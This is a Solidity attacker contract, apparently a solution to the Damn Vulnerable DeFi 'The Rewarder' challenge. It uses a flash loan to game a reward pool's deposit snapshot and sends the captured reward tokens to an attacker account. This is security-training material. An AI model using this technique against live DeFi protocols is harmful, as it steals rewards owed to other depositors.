// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

/**
 * @title TheRewarderPool
 */
contract TheRewarderAttacker {
    FlashLoanerPool private _loaner;
    TheRewarderPool private _rewarder;
    DamnValuableToken private _liquidityToken;
    RewardToken private _rewardToken;

    constructor(
        address loanerAddress,
        address rewarderAddress,
        address liquidityTokenAddress,
        address rewardTokenAddress
    ) {
        _loaner = FlashLoanerPool(loanerAddress);
        _rewarder = TheRewarderPool(rewarderAddress);
        _liquidityToken = DamnValuableToken(liquidityTokenAddress);
        _rewardToken = RewardToken(rewardTokenAddress);
    }

    function receiveFlashLoan(uint256 borrowedAmount) public payable {
        console.log("receiveFlashLoan(", borrowedAmount, ")");
        _rewarder.deposit(borrowedAmount);

        _rewarder.withdraw(borrowedAmount);
        console.log("_rewarder.withdraw(", borrowedAmount, ")");

        _liquidityToken.transfer(address(_loaner), borrowedAmount);
        console.log("_token.transfer(, ", borrowedAmount, ")");
    }

    function attack(
        address payable attackerEOA
    ) public {
        console.log("attack()", attackerEOA);
        uint256 loanerBalance = _liquidityToken.balanceOf(address(_loaner));
        _liquidityToken.approve(address(_rewarder), loanerBalance);
        _loaner.flashLoan(loanerBalance);
        console.log("_token.flashLoan( ", loanerBalance, " ) - complete");

        // send reward tokens to attacker EOA
        require(_rewardToken.balanceOf(address(this)) > 0, "reward balance was 0");
        console.log("require( ", _rewardToken.balanceOf(address(this)), " > 0 )");
        console.log("_rewardToken.transfer( ", attackerEOA, ", ", _rewardToken.balanceOf(address(this)));
        bool success = _rewardToken.transfer(
            attackerEOA,
            _rewardToken.balanceOf(address(this))
        );
        require(success, "reward transfer failed");
    }

    receive() external payable {}
}